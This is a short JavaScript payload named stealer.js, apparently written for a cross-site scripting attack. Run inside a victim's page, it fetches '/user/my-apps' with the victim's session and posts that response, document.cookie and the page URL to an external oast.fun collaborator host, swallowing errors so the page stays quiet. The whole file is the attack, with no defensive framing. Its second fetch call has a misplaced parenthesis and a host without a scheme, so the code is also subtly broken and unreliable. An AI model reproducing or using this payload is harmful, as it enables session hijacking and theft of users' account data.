// stealer.js — runs in the target origin with victim's session
(async () => {
  try {
    // 1. Same-origin fetch — victim's cookies are sent automatically
    const res  = await fetch('/user/my-apps', { credentials: 'include' });
    const data = await res.text();

    // 2. Exfiltrate to Burp Collaborator
    //    mode:'no-cors' → request fires, response is opaque (we don't need it)
    await fetch('hsrjvzfyftnlzigkbkplqcrzy9etsscvd.oast.fun'), {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({
        url: location.href,
        origin: location.origin,
        cookies: document.cookie,   // only if not HttpOnly
        response: data
      })
    });
  } catch (e) {
    // Swallow errors — keep the page quiet
  }
})();